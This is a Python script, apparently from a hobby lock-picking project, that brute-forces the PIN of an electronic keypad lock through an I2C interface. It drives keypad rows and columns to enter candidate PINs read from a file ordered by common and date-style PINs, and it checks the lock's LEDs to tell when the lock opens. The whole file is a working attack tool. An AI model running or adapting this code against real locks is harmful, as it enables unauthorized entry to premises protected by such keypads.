from i2c_lockpick import *

def drive_bruteforce(char):
    '''
    This function drives the symbol onto the lock system.
    '''
    MATRIX = [
    ['1', '2', '3'],
    ['4', '5', '6'],
    ['7', '8', '9'],
    ['*', '0', '#']
    ]

    #first, find out which row and column needs to be driven to drive this char
    col = 0
    row = 0
    for i in range(4):
        if char in MATRIX[i]:
            row = i
            for j in range(3):
                if char == MATRIX[i][j]:
                    col = j

    #then wait for the correct row to be driven by the lock system
    while True:
        if row_read() == row:
            #once the correct row is driven, drive the correct column
            column(col)
            time.sleep(0.3)
            return


def brute_force():
    '''
    This function implements the brute force attack technique.
    It reads the order of the passwords it should check from the file 'brute_force.txt'.
    The file was created with optimization of cracking times in mind.
    The first 20 lines are the 20 most common PINs according to the study held by:
    http://datagenetics.com/blog/september32012/index.html
    The next 446 lines are lines in the format of DDMM/MMDD, where DD - day of the month,
    MM - month. According to the article mentioned above, people tend to use PINs
    in this format very often.
    The rest of the files are the passwords generated randomly in a way so that there are
    no duplicates.
    '''

    f = open('brute_force.txt', 'r')

    for row in f:
        password = row
        password = password.strip('\n')

        for letter in password:
            drive(letter)

        time.sleep(0.2)
        leds = check_leds()
        if leds[0] == True: #If the red LED lights up, check the next password
            continue
        elif leds[1] == True: #if the green LED lights up return the password, the lock is picked!
            return password
